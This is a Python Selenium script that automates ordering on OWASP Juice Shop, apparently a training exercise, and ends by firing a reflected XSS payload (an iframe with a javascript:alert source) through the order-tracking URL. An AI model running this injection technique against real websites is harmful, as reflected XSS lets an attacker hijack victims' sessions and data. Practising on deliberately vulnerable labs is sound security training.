from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import jsbeautifier
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import os
from selenium.webdriver.support.ui import Select

try:
	IP_ADDRESS = os.environ['OWASP_JUICE_SHOP_IP_ADDRESS']
	PORT = os.environ['OWASP_JUICE_SHOP_PORT']
  #User opens browser
	driver = webdriver.Chrome()
	driver.get(f"http://{IP_ADDRESS}:{PORT}")

	#User navigates to registration screen
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Dismiss')]"))).click()
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Account')]"))).click()
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Login')]"))).click()
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//a[contains(., 'Not yet a customer?')]"))).click()

	#User registers as new user
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "emailControl"))).send_keys("test@test.com")
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "passwordControl"))).send_keys("Password1!")
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "repeatPasswordControl"))).send_keys("Password1!")

	mat_select_element = WebDriverWait(driver, 10).until(
		EC.element_to_be_clickable((By.CSS_SELECTOR, "mat-select[role='combobox']"))
	)
	mat_select_element.click()
	mat_option_element = WebDriverWait(driver, 10).until(
		EC.element_to_be_clickable((By.XPATH, f"//mat-option[contains(., 'Your eldest siblings middle name?')]"))
	)
	mat_option_element.click()
	
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "securityAnswerControl"))).send_keys("test")
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Register')]"))).click()

	#User logs in
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Account')]"))).click()
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Login')]"))).click()
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "email"))).send_keys("test@test.com")
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "password"))).send_keys("Password1!")
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Log in')]"))).click()

	#User adds first 4[arbitrary] items to basket
	addToBasketButtons = WebDriverWait(driver, 20).until(EC.presence_of_all_elements_located((By.XPATH, "//button[contains(., 'Add to Basket')]")))
	for i in range(4):
		WebDriverWait(driver, 20).until(EC.element_to_be_clickable(addToBasketButtons[i])).click()
  
	#User proceeds to checkout
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Your Basket')]"))).click()
	checkoutButton = WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Checkout')]")))
	driver.execute_script("arguments[0].click();", checkoutButton)
	
	#User adds new address
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Add New Address')]"))).click()
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Please provide a country.']"))).send_keys("USA")
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Please provide a name.']"))).send_keys("test")
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Please provide a mobile number.']"))).send_keys("1234567890")
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Please provide a ZIP code.']"))).send_keys("12345")
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "address"))).send_keys("123 Main St")
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Please provide a city.']"))).send_keys("Test")
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Please provide a state.']"))).send_keys("Test")
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Submit')]"))).click()

	#User selects address for delivery
	radioButtonIdAddress = "mat-radio-41-input"  # Replace with the actual ID
	driver.execute_script(f"document.getElementById('{radioButtonIdAddress}').click();")
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Continue')]"))).click()

	#User selects delivery speed
	radioButtonIdDelivery = "mat-radio-42-input"  # Replace with the actual ID
	driver.execute_script(f"document.getElementById('{radioButtonIdDelivery}').click();")
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Continue')]"))).click()

	#User adds new credit card
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "mat-expansion-panel-header-0"))).click()
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable(( By.XPATH, "//mat-label[text()='Name']/ancestor::mat-form-field//input" ))).send_keys("Test Person")
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable(( By.XPATH, "//mat-label[text()='Card Number']/ancestor::mat-form-field//input" ))).send_keys("1234123412341234")
	month_element = WebDriverWait(driver, 20).until(EC.element_to_be_clickable(( By.XPATH, "//mat-label[text()='Expiry Month']/ancestor::mat-form-field//select" )))
	month_select = Select(month_element) 
	month_select.select_by_value('12')
	year_element = WebDriverWait(driver, 20).until(EC.element_to_be_clickable(( By.XPATH, "//mat-label[text()='Expiry Year']/ancestor::mat-form-field//select" )))
	year_select = Select(year_element) 
	year_select.select_by_value('2099')
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "submitButton"))).click()
	
	#User submits payment
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//mat-row[.//mat-cell[contains(text(), '************1234')]]//mat-radio-button"))).click()
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Continue')]"))).click()
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Place your order and pay')]"))).click()

	#User navigates to order history
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Account')]"))).click()
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Orders & Payment')]"))).click()
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Order History')]"))).click()
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[aria-label="Track Your Order"]'))).click()

	#User notices order id in URL GET request is printed on page
	order_id = WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//h1/span[contains(text(), 'Search Results')]/following-sibling::span/code" ))).text
	print(f"Your order id is: {order_id}")
	
	#User attempts reflected xss in URL
	driver.get(f"http://{IP_ADDRESS}:{PORT}/#/track-result?id=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E")
	driver.refresh()
	
	#User clicks 'Ok' button of alert box
	WebDriverWait(driver, 20).until(EC.alert_is_present())
	alert = driver.switch_to.alert
	alert.accept()
finally:
  driver.quit()
